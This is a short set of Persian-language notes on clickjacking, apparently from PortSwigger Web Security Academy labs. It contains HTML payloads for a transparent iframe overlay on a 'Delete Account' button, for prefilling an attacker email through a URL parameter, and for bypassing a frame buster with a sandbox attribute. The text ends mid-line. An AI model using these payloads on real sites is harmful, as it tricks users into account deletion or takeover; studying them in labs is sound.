# Clickjacking

## Exploit
- **حمله مقدماتی با حفاظت CSRF Token**
  - در کد زیر پیکسل ها را تغییر می دهیم تا متن *Click me* روی کلید *Delete Account* بیفند ، برای این کار باید ابتدا opacity را برابر 0.1 قرار دهیم و پس از بدست آوردن موقعیت درست، آن را روی 0.0001 تنظیم کنیم:
```HTML
<style>
   iframe {
       position:relative;
       width:700px;
       height: 500px;
       opacity: $opacity;
       z-index: 2;
   }
   div {
       position:absolute;
       top:300px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Test me</div>
<iframe src="https://ac721fc61e66ddc6c0325ed500ca00d4.web-security-academy.net/my-account"></iframe>
```
- **پر کردن خودکار فیلدهای فرم با استفاده از URL Param**
  - برای این منظور در کد فوق تگ iframe را به شکل زیر تغییر می دهیم:
```HTML
<iframe src="https://ac721fc61e66ddc6c0325ed500ca00d4.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
- **بای پاس کردن frame buster**
  - در اینحالت اجازه iframe کردن سایت قربانی را نخواهیم داشت، برای دور زدن این محافظت attribute زیر را به تگ iframe اضافه می کنیم:
```HTML
<iframe sandbox="allow-forms" src="https://ac1f1fd41fe93c54c00a5216000e009e.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
``` 
- ی
